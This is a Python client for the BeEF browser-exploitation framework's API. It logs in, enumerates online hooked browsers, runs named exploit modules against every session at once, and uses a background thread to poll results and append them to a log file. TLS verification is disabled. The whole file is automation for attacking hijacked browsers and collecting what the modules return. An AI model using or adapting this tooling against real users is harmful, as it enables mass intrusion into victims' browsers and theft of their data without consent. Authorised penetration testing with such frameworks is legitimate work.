import time
import threading
import requests
import urllib3
from expiringdict import ExpiringDict


urllib3.disable_warnings()


API_LOGIN = "%s/api/admin/login"
API_HOOKED_SESSIONS = "%s/api/hooks?token=%s"
API_LIST_COMMANDS = "%s/api/modules?token=%s"
API_EXECUTE_MODULE = "%s/api/modules/%s/%s?token=%s"
API_COMMAND_RESULT = "%s/api/modules/%s/%s/%s?token=%s"


class BeefAPI:
    def __init__(self, host):
        self.host = host
        self.token = None

    def login(self, username, password):
        response = requests.post(API_LOGIN % self.host,
                                 json={"username": username, "password": password}, verify=False)
        data = response.json()
        self.token = data["token"]

    def get_online_sessions(self):
        response = requests.get(API_HOOKED_SESSIONS % (self.host, self.token),
                                verify=False)
        data = response.json()
        return data["hooked-browsers"]["online"]

    def get_exploits_of_names(self, names):
        response = requests.get(API_LIST_COMMANDS % (self.host, self.token),
                                verify=False)
        data = response.json()
        target_exploits = {}
        for exploit in data.values():
            if exploit["name"] in names:
                target_exploits[exploit["name"]] = exploit
        return target_exploits

    def execute_exploit(self, session_ids, exploit_id, options=None):
        response_data = {}
        for session_id in session_ids:
            response = requests.post(API_EXECUTE_MODULE % (self.host, session_id, exploit_id, self.token),
                                     json=options if options != None else {}, verify=False)
            data = response.json()
            data["module_id"] = exploit_id
            response_data[session_id] = data
        return response_data

    def get_command_result(self, session_id, exploit_id, command_id):
        response = requests.get(API_COMMAND_RESULT % (
            self.host, session_id, exploit_id, command_id, self.token), verify=False)
        data = response.json()
        return data


class ResultPoller:
    def __init__(self, beef: BeefAPI, log_path):
        self.beef = beef
        self.log_path = log_path
        self.recent_commands: ExpiringDict = ExpiringDict(
            max_len=50, max_age_seconds=60)
        self.poll_thread = None

    def add_recent(self, commands: dict):
        for session_id, command in commands.items():
            self.recent_commands[session_id] = command

    def poll(self):
        while self.poll_thread != None:
            for session_id, command in self.recent_commands.items():
                command_result = self.beef.get_command_result(
                    session_id, command["module_id"], command["command_id"])
                if command_result:
                    self.log_result(command_result)
                    self.recent_commands.pop(session_id)
            time.sleep(1)

    def log_result(self, command_result):
        with open(self.log_path, "a") as log_file:
            log_file.write(command_result["0"]["data"] + "\n")

    def start(self):
        self.poll_thread = threading.Thread(target=self.poll, daemon=True)
        self.poll_thread.start()
